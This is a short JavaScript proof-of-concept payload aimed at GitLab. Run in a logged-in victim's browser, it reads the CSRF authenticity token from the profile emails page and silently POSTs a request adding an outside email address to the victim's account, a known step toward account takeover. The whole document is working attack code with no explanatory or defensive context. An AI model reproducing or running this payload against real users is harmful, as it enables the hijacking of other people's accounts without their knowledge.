(async () => {
  const res = await fetch("https://gitlab.com/-/profile/emails", {
    credentials: "include",
  });
  const text = await res.text();

  const token = text.match(/name="authenticity_token" value="([^"]+)"/)?.[1];
  if (!token) {
    console.error("CSRF token not found");
    return;
  }

  const params = new URLSearchParams();
  params.append("authenticity_token", token);
  params.append("email[email]", "powlskydz6845456456456@nikzebio.com");

  await fetch("https://gitlab.com/-/profile/emails", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Origin": "https://gitlab.com"
    },
    body: params.toString()
  });

  console.log("PoC executed");
})();
